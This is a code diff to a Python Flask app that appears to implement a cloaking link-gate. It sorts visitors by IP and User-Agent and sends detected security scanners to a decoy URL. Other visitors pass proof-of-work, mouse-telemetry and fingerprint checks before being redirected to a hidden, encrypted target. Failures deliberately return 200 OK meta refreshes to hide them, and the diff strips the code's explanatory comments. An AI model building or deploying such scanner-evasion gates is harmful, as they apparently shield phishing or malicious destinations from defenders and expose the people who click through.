@@ -169,9 +169,8 @@ def _static_page(title: str, text: str, status_code: int):
     html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
     return make_response(html, status_code)
 
-# --- NEW: Redirect with 200 OK ---
+# --- Redirect with 200 OK ---
 def _meta_redirect(url: str):
-    """Returns a 200 OK response with an HTML meta refresh to the target URL."""
     html = f"""<!DOCTYPE html>
     <html>
     <head>
@@ -394,7 +393,6 @@ def landing(token: str):
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     log.info(json.dumps({"event": "landing_get", **tag}))
     
-    # If it's a scanner, send to unwanted URL with a 302
     if tag["scanner"]:
         unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)
         log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
@@ -438,8 +436,6 @@ def bind_fingerprint():
 
 @app.route("/submit/<path:token>", methods=["POST"])
 def execute(token: str):
-    # For ANY verification failure below, we use _meta_redirect to send a 200 OK
-    # with a meta refresh, instead of a 400 Bad Request.
     unwanted = UNWANTED_REDIRECT_URL
     
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
@@ -462,7 +458,6 @@ def execute(token: str):
     if not cookie_fp:
         return _meta_redirect(unwanted)
 
-    # PoW
     submitted_pow = request.form.get("pow_nonce", "")
     seed = nonce_data.get("challenge", "")
     if not seed or not submitted_pow:
@@ -472,7 +467,6 @@ def execute(token: str):
     if not test_hash.startswith("0000"):
         return _meta_redirect(unwanted)
 
-    # Telemetry
     drag_time = int(request.form.get("drag_time", 0))
     drag_events = int(request.form.get("drag_events", 0))
     coords_json = request.form.get("mouse_coords", "[]")
@@ -493,17 +487,14 @@ def execute(token: str):
     except Exception:
         return _meta_redirect(unwanted)
 
-    # Fingerprint rate limit
     if fp_rate_limit(cookie_fp):
         log.info(json.dumps({"event": "fp_rate_blocked", "fp": cookie_fp[:16]}))
         return _meta_redirect(unwanted)
 
-    # All checks pass → decrypt target and redirect the real user
     data = unseal_payload(token)
     if not data or "target" not in data:
         return _meta_redirect(unwanted)
 
-    # Real target redirect (normal 303)
     resp = make_response(redirect(data["target"], code=303))
     resp.delete_cookie("gate_session", path="/")
     return resp
